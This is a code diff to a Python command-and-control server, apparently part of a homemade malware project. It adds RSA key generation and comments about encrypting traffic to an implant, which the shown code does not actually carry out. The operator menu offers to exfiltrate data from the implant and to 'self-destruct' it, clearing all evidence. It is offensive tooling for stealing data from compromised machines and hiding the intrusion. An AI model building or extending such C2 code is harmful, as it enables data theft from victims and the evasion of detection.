@@ -2,6 +2,11 @@ import colorama
 from colorama import Fore, Back, Style
 import socket
 import sys
+import rsa
+
+
+#generate the rsa key used by C2
+(pubkey, privkey) = rsa.newkeys(2048)
 
 # Create a TCP/IP socket
 c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,6 +31,7 @@ def recieve_exfil():
     try:
         #Recieves and prints the data
         while True:
+            #encrypted
             data = connection.recv(100)
             if data:
                 print(data)
@@ -49,7 +55,7 @@ def send_implant(comm):
 while(True):
     print("Options:")
     print("1. Self-destruct (clears implant and removes all evidence)")
-    print("2. Exfil")
+    print("2. Exfil data")
     print("3. Exit")
     print(f"{Fore.CYAN}What would you like to do:")
     choice = input(">>")
@@ -67,8 +73,10 @@ while(True):
         exfil = True
         while(exfil == True):
             #Send command to exfiltrate
+
+            #encrypt command, send with public key
             send_implant('2')
-            #Recieve the exfil
+            #Recieve the exfil and decrypt the response
             recieve_exfil()
             print("Press n to end: any other key to continue")
             c = input(">>")
